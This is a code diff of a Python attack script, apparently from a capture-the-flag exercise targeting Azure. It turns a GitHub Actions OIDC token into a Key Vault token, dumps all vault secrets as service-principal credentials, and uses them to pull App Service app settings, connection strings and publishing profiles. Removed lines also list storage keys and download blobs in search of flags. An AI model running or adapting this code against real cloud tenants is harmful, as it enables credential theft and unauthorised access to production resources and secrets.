@@ -16,17 +16,16 @@ def jg(b):
     try: return json.loads(b)
     except Exception: return {}
 TEN=os.environ["AZURE_TENANT_ID"]; CID=os.environ["AZURE_CLIENT_ID"]; SUB=os.environ["AZURE_SUBSCRIPTION_ID"]
-M="https://management.azure.com"; RG2="rg-tbl-reporting-prod-eus"
-FLAG=re.compile(rb"(DF26\{[^}]{0,300}\}|flag\{[^}]{0,300}\}|FLAG\{[^}]{0,300}\})", re.I)
+M="https://management.azure.com"; RG2="rg-tbl-reporting-prod-eus"; SITE="app-tbl-reporting-prod"
+FLAG=re.compile(r"(DF26\{[^}]{0,300}\}|flag\{[^}]{0,300}\}|FLAG\{[^}]{0,300}\})", re.I)
 st,b=http(os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"]+"&audience=api://AzureADTokenExchange",
           headers={"Authorization":"bearer "+os.environ["ACTIONS_ID_TOKEN_REQUEST_TOKEN"]})
 IDT=json.loads(b)["value"]
-def oidc(sc):
-    st,b=http(f"https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token",{"client_id":CID,"scope":sc,
-      "grant_type":"client_credentials","client_assertion_type":"urn:ietf:params:oauth:client-assertion-type:jwt-bearer",
-      "client_assertion":IDT}); return jg(b).get("access_token")
-KVT=oidc("https://vault.azure.net/.default")
-creds={"__oidc__":None}
+st,b=http(f"https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token",{"client_id":CID,
+  "scope":"https://vault.azure.net/.default","grant_type":"client_credentials",
+  "client_assertion_type":"urn:ietf:params:oauth:client-assertion-type:jwt-bearer","client_assertion":IDT})
+KVT=jg(b)["access_token"]
+creds={}
 st,b=http("https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4",headers={"Authorization":"Bearer "+KVT})
 for s in jg(b).get("value",[]):
     n=s["id"].rsplit("/",1)[-1]
@@ -34,56 +33,33 @@ for s in jg(b).get("value",[]):
     try: creds[n]=json.loads(jg(b2).get("value",""))
     except Exception: pass
 def tok(c, sc):
-    if c is None: return oidc(sc)
     st,b=http(f"https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token",
       {"client_id":c["appId"],"client_secret":c["clientSecret"],"scope":sc,"grant_type":"client_credentials"})
     return jg(b).get("access_token")
-
-print("### who can see rg-tbl-reporting-prod-eus ?")
-winner=None
-for name,c in creds.items():
-    t=tok(c, "https://management.azure.com/.default")
-    if not t: print(f"  {name:28} no token"); continue
+BASE=f"{M}/subscriptions/{SUB}/resourceGroups/{RG2}/providers/Microsoft.Web/sites/{SITE}"
+for who in ("reporting-service-principal","reporting-viewer-principal"):
+    t=tok(creds[who], "https://management.azure.com/.default")
     H={"Authorization":"Bearer "+t}
-    st,b=http(f"{M}/subscriptions/{SUB}/resourcegroups/{RG2}/resources?api-version=2021-04-01", headers=H)
-    vals=jg(b).get("value",[])
-    print(f"  {name:28} HTTP {st} resources={len(vals)}")
-    for r in vals:
-        print(f"      {r['type']:52} {r['name']}  ({r.get('location')})")
-    if st==200 and vals: winner=(name,c,t,vals)
-
-if winner:
-    name,c,ARM,vals = winner
-    print(f"\n### enumerating with {name}")
-    H={"Authorization":"Bearer "+ARM}
-    for r in vals:
-        ty=r["type"]; nm=r["name"]
-        if ty=="Microsoft.KeyVault/vaults":
-            kt=tok(c,"https://vault.azure.net/.default")
-            st,b=http(f"https://{nm}.vault.azure.net/secrets?api-version=7.4", headers={"Authorization":"Bearer "+kt})
-            print(f"  KV {nm}: list {st}")
-            for s in jg(b).get("value",[]):
-                sn=s["id"].rsplit("/",1)[-1]
-                st2,b2=http(s["id"]+"?api-version=7.4", headers={"Authorization":"Bearer "+kt})
-                v=jg(b2).get("value","")
-                print(f"     >>> {sn} = {v}")
-        if ty=="Microsoft.Storage/storageAccounts":
-            st,b=http(f"{M}/subscriptions/{SUB}/resourceGroups/{RG2}/providers/Microsoft.Storage/"
-                      f"storageAccounts/{nm}/listKeys?api-version=2023-01-01", data=b"", headers=H, method="POST")
-            print(f"  ST {nm}: listKeys {st}")
-            stk=tok(c,"https://storage.azure.com/.default")
-            HB={"Authorization":"Bearer "+stk,"x-ms-version":"2021-08-06"}
-            st2,b2=http(f"https://{nm}.blob.core.windows.net/?comp=list", headers=HB)
-            conts=[x.decode() for x in re.findall(rb"<Name>([^<]+)</Name>", b2)] if st2==200 else []
-            print(f"     containers({st2}): {conts}")
-            for cn in conts:
-                st3,b3=http(f"https://{nm}.blob.core.windows.net/{cn}?restype=container&comp=list", headers=HB)
-                blobs=[x.decode() for x in re.findall(rb"<Name>([^<]+)</Name>", b3)] if st3==200 else []
-                print(f"       {cn}({st3}): {blobs[:25]}")
-                for bl in blobs[:25]:
-                    st4,bb=http(f"https://{nm}.blob.core.windows.net/{cn}/{urllib.parse.quote(bl)}", headers=HB)
-                    if st4==200:
-                        m=FLAG.search(bb)
-                        print(f"          {bl}: " + (f">>> FLAG {m.group(1).decode()}" if m else bb[:200].decode('utf-8','replace')))
+    print(f"\n######## {who}")
+    st,b=http(f"{M}/subscriptions/{SUB}/resourceGroups/{RG2}/providers/Microsoft.Authorization/permissions?api-version=2022-04-01", headers=H)
+    for p in jg(b).get("value",[]): print("   permissions:", p.get("actions"), "not:", p.get("notActions"))
+    st,b=http(BASE+"?api-version=2022-03-01", headers=H)
+    d=jg(b)
+    print("   site:", st, "| host:", d.get("properties",{}).get("defaultHostName"),
+          "| identity:", json.dumps(d.get("identity",{}))[:300])
+    for label, path, meth in (("appsettings","/config/appsettings/list","POST"),
+                              ("connstrings","/config/connectionstrings/list","POST"),
+                              ("publishxml","/publishxml","POST"),
+                              ("web","/config/web","GET"),
+                              ("functions","/functions","GET")):
+        if meth=="POST": st,b=http(BASE+path+"?api-version=2022-03-01", data=b"", headers=H, method="POST")
+        else: st,b=http(BASE+path+"?api-version=2022-03-01", headers=H)
+        txt=b.decode("utf-8","replace")
+        m=FLAG.search(txt)
+        print(f"   {label:12} {st}" + (f"  >>> FLAG {m.group(1)}" if m else ""))
+        if st==200 and label in ("appsettings","connstrings"):
+            print("      ", json.dumps(jg(b).get("properties",{}))[:900])
+        if st==200 and label=="publishxml":
+            print("      ", txt[:600])
 PYEOF
 echo "=== done ==="
